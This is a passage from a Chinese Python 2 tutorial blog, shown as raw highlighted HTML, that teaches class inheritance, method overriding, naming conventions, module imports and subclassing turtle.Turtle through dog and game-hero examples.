punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，汪汪~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义一个SheepDog类，它是Dog的子类，继承Dog的构造方法</span><span class="token keyword">class</span> <span class="token class-name">SheepDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 定义构造方法，这里添加了一个特性num_of_sheeps</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>num_of_sheeps<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 用super()初始化构造父类，这里的super()函数与python3中有所不同！</span>        super<span class="token punctuation">(</span>SheepDog<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 设置方法属性</span>        self<span class="token punctuation">.</span>num_of_sheeps <span class="token operator">=</span> num_of_sheeps    <span class="token keyword">def</span> <span class="token function">protect</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我开始保护羊群了，汪汪！'</span><span class="token comment" spellcheck="true"># 定义警犬</span><span class="token keyword">class</span> <span class="token class-name">PoliceDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>ability<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>PoliceDog<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>ability <span class="token operator">=</span> ability    <span class="token keyword">def</span> <span class="token function">detect</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我开始侦擦了，汪汪！'</span>        <span class="token comment" spellcheck="true"># 调用父类方法</span>        super<span class="token punctuation">(</span>PoliceDog<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，这是我自己的方法，我重写了父类方法~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义宠物犬</span><span class="token keyword">class</span> <span class="token class-name">PetDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>price<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>PetDog<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>price <span class="token operator">=</span> price    <span class="token keyword">def</span> <span class="token function">sing</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我开始唱歌了，汪汪！'</span><span class="token comment" spellcheck="true"># 警犬</span>pd <span class="token operator">=</span> PoliceDog<span class="token punctuation">(</span><span class="token string">'警犬'</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 重写父类方法</span>pd<span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>练习：</p><pre class="line-numbers language-python"><code class="language-python">把剩下的两只狗的bark方法也进行重写<span class="token comment" spellcheck="true"># 定义构造方法</span><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>height <span class="token operator">=</span> height        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">10</span>    <span class="token comment" spellcheck="true"># 构造bark方法</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，汪汪~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义牧羊犬</span><span class="token keyword">class</span> <span class="token class-name">SheepDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 定义构造方法，这里添加了一个特性num_of_sheeps</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>num_of_sheeps<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 用super()初始化构造父类，这里的super()函数与python3中有所不同！</span>        super<span class="token punctuation">(</span>SheepDog<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 设置方法属性</span>        self<span class="token punctuation">.</span>num_of_sheeps <span class="token operator">=</span> num_of_sheeps    <span class="token keyword">def</span> <span class="token function">protect</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我开始保护羊群了，汪汪！'</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，这是我自己的方法，我重写了父类方法~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>        super<span class="token punctuation">(</span>SheepDog<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义警犬</span><span class="token keyword">class</span> <span class="token class-name">PoliceDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>ability<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>PoliceDog<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>ability <span class="token operator">=</span> ability    <span class="token keyword">def</span> <span class="token function">detect</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我开始侦擦了，汪汪！'</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，这是我自己的方法，我重写了父类方法~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 调用父类方法</span>        super<span class="token punctuation">(</span>PoliceDog<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义宠物犬</span><span class="token keyword">class</span> <span class="token class-name">PetDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>price<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>PetDog<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>price <span class="token operator">=</span> price    <span class="token keyword">def</span> <span class="token function">sing</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我开始唱歌了，汪汪！'</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，这是我自己的方法，我重写了父类方法~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>        super<span class="token punctuation">(</span>PetDog<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 牧羊犬</span>sd <span class="token operator">=</span> SheepDog<span class="token punctuation">(</span><span class="token string">'牧羊犬'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 重写父类方法</span>sd<span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 警犬</span>pd <span class="token operator">=</span> PoliceDog<span class="token punctuation">(</span><span class="token string">'警犬'</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 重写父类方法</span>pd<span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 宠物犬</span>petd <span class="token operator">=</span> PetDog<span class="token punctuation">(</span><span class="token string">'宠物犬'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 重写父类方法</span>petd<span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h3><pre><code>类名：驼峰，如SheepDog、PoliceDog方法名、变量名、参数、文件名：        全小写，多个单词下划线连接        如：get_pwd，start_attack        如果是文件名，可以变成getpwd，为了引用起来方便私有属性：在属性前加_，例如_weight，不过依然可以访问，只是一种命名规范Python解释器御用：方法前加__，例如：__init__</code></pre><h3 id="模块、类和引入"><a href="#模块、类和引入" class="headerlink" title="模块、类和引入"></a>模块、类和引入</h3><p>现在我们创建一个新的文件game.py，引用我们上文写好的dog.py，像这样就可以了</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> dogpet_dog <span class="token operator">=</span> dog<span class="token punctuation">.</span>PetDog<span class="token punctuation">(</span><span class="token string">'小可爱'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">998</span><span class="token punctuation">)</span>pet_dog<span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> pet_dog<span class="token punctuation">.</span>price<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="标准库中的类"><a href="#标准库中的类" class="headerlink" title="标准库中的类"></a>标准库中的类</h3><p>我们结合标准库中的类来进行一个继承，在python中有一个Turtle类，是一个绘图海龟，现在我们来写一个属于自己的小海龟<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201027103858684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>这里物品们定义一个自己的类Myturtle，并且定义一个自己的方法big_circle:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> turtle<span class="token keyword">class</span> <span class="token class-name">MyTurtle</span><span class="token punctuation">(</span>turtle<span class="token punctuation">.</span>Turtle<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">big_circle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>color<span class="token punctuation">(</span><span class="token string">'red'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>s <span class="token operator">=</span> turtle<span class="token punctuation">.</span>Screen<span class="token punctuation">(</span><span class="token punctuation">)</span>t <span class="token operator">=</span> MyTurtle<span class="token punctuation">(</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span>big_circle<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020102710541020.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>后续我会在另一篇文章中更新一下这个部分，本文中就先不做过多介绍了</p><h3 id="其他实例作为属性"><a href="#其他实例作为属性" class="headerlink" title="其他实例作为属性"></a>其他实例作为属性</h3><p>假设现在我们要给每条出厂的宠物狗配置一个狗窝，我们可以通过<strong>init</strong>方法添加参数来实现，也可以构造一个DogHost方法，把他实例化来充当宠物狗的属性：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 定义构造方法</span><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>height <span class="token operator">=</span> height        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">10</span>        self<span class="token punctuation">.</span>_weight <span class="token operator">=</span> <span class="token number">30</span>    <span class="token comment" spellcheck="true"># 构造bark方法</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，汪汪~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义一个SheepDog类，它是Dog的子类，继承Dog的构造方法</span><span class="token keyword">class</span> <span class="token class-name">SheepDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 定义构造方法，这里添加了一个特性num_of_sheeps</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>num_of_sheeps<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 用super()初始化构造父类，这里的super()函数与python3中有所不同！</span>        super<span class="token punctuation">(</span>SheepDog<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 设置方法属性</span>        self<span class="token punctuation">.</span>num_of_sheeps <span class="token operator">=</span> num_of_sheeps    <span class="token keyword">def</span> <span class="token function">protect</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我开始保护羊群了，汪汪！'</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，这是我自己的方法，我重写了父类方法~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>        super<span class="token punctuation">(</span>SheepDog<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义警犬</span><span class="token keyword">class</span> <span class="token class-name">PoliceDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>ability<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>PoliceDog<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>ability <span class="token operator">=</span> ability    <span class="token keyword">def</span> <span class="token function">detect</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我开始侦擦了，汪汪！'</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，这是我自己的方法，我重写了父类方法~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 调用父类方法</span>        super<span class="token punctuation">(</span>PoliceDog<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义宠物犬</span><span class="token keyword">class</span> <span class="token class-name">PetDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>price<span class="token punctuation">,</span>house<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>PetDog<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>price <span class="token operator">=</span> price        self<span class="token punctuation">.</span>house <span class="token operator">=</span> house    <span class="token keyword">def</span> <span class="token function">sing</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我开始唱歌了，汪汪！'</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，这是我自己的方法，我重写了父类方法~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>        super<span class="token punctuation">(</span>PetDog<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义狗窝</span><span class="token keyword">class</span> <span class="token class-name">DogHost</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>num <span class="token operator">=</span> num        <span class="token keyword">print</span> <span class="token string">'{}号狗窝已创建'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>num<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>定义好了之后，我们去另一个game.py脚本中引用它：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> doghouse <span class="token operator">=</span> dog<span class="token punctuation">.</span>DogHost<span class="token punctuation">(</span><span class="token string">'9527'</span><span class="token punctuation">)</span>pet_dog <span class="token operator">=</span> dog<span class="token punctuation">.</span>PetDog<span class="token punctuation">(</span><span class="token string">'小可爱'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">998</span><span class="token punctuation">,</span>house<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201027135940419.png#pic_center" alt="在这里插入图片描述"></p><h3 id="写一个简单的英雄联盟"><a href="#写一个简单的英雄联盟" class="headerlink" title="写一个简单的英雄联盟"></a>写一个简单的英雄联盟</h3><ol><li>参考王者荣耀或者你喜欢的其他游戏，创建相应的类和实例。</li><li>要求至少有3个类。</li><li>要求必须有继承关系。</li><li>要求必须有实例属性和类属性。</li><li>要求必须有实例方法和类方法。</li></ol><p>我的答案：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Time    : 2020/10/27 15:51</span><span class="token comment" spellcheck="true"># @Author  : Shadow</span><span class="token comment" spellcheck="true"># @Site    : </span><span class="token comment" spellcheck="true"># @File    : LOL.py</span><span class="token comment" spellcheck="true"># @Software: PyCharm</span><span class="token comment" spellcheck="true"># 定义一个Hero类作为父类</span><span class="token keyword">class</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 定义类属性</span>    num_of_hero <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 定义构造方法，并把生成的英雄追加到num_of_hero这个类属性中</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>blood<span class="token punctuation">,</span>mana<span class="token punctuation">,</span>power<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> blood        self<span class="token punctuation">.</span>mana <span class="token operator">=</span> mana        self<span class="token punctuation">.</span>power <span class="token operator">=</span>power        <span class="token keyword">print</span> <span class="token string">'英雄【{}】已生成！'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>num_of_hero<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 定义attack方法执行攻击行为</span>    <span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>hero<span class="token punctuation">)</span><span class="token punctuation">:</span>        hero<span class="token punctuation">.</span>blood <span class="token operator">=</span> hero<span class="token punctuation">.</span>blood <span class="token operator">-</span> self<span class="token punctuation">.</span>power        <span class="token keyword">if</span> hero<span class="token punctuation">.</span>blood <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">'{}剩余血量为：{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hero<span class="token punctuation">.</span>name<span class="token punctuation">,</span>hero<span class="token punctuation">.</span>blood<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            hero<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">print</span> <span class="token string">'{}已被{}击杀!'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hero<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 定义info方法来输出英雄属性</span>    <span class="token keyword">def</span> <span class="token function">info</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'名称：{}\n血量：{}\n法力值：{}\n攻击力：{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>self<span class="token punctuation">.</span>blood<span class="token punctuation">,</span>self<span class="token punctuation">.</span>mana<span class="token punctuation">,</span>self<span class="token punctuation">.</span>power<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义Tank类作为Hero类的子类</span><span class="token keyword">class</span> <span class="token class-name">Tank</span><span class="token punctuation">(</span>Hero<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 定义构造方法</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>blood<span class="token punctuation">,</span>mana<span class="token punctuation">,</span>power<span class="token punctuation">,</span>armor<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 继承父类属性</span>        super<span class="token punctuation">(</span>Tank<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>blood<span class="token punctuation">,</span>mana<span class="token 